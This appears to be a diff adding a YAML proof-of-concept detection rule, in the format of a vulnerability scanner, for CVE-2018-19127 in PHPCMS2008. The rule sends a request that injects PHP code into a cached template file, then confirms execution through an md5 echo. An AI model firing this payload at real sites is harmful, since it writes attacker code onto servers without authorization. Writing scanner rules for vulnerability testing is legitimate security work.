@@ -1,0 +1,26 @@
+detail:
+  Affected Version: PHPCMS2008
+  author: pa55w0rd(www.pa55w0rd.online/)
+  links:
+  - https://github.com/ab1gale/phpcms-2008-CVE-2018-19127
+expression: r0() && r1()
+manual: true
+name: poc-yaml-phpcms-cve-2018-19127
+rules:
+  r0:
+    expression: response.status == 200
+    request:
+      cache: true
+      follow_redirects: true
+      method: GET
+      path: /type.php?template=tag_(){}%3b@unlink(file)%3becho md5($_GET[1])%3b{//../rss
+  r1:
+    expression: response.body.bcontains(bytes(md5(string(r))))
+    request:
+      cache: true
+      follow_redirects: true
+      method: GET
+      path: /data/cache_template/rss.tpl.php?1={{r}}
+set:
+  r: randomInt(800000000, 1000000000)
+transport: http
